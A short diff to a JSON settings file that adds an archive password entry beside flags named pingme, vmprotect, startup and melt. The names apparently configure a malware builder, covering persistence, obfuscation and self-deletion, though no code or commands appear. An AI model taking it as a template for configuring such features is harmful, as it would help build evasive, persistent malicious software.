@@ -4,7 +4,8 @@
         "pingme" : true,
         "vmprotect" : true,
         "startup" : true,
-        "melt" : false
+        "melt" : false,
+        "archivePassword" : "blank"
     },
     
     "modules" : {
